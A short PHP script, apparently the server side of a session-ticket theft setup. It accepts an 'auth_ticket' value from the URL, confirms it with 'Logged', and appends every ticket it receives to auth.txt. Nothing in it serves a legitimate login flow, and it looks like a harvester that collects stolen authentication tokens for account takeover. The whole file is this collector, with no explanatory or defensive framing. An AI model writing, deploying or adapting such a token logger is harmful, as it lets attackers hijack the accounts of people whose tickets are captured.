<?php
if(!$_GET['auth_ticket']){
die('Auth Empty!');
} 
echo 'Logged ' . htmlspecialchars($_GET["auth_ticket"]);

$f = fopen("auth.txt", 'a+') or die( 'No txt file!');
fwrite($f, "\n". $_GET["auth_ticket"]);
fclose($f);
?>
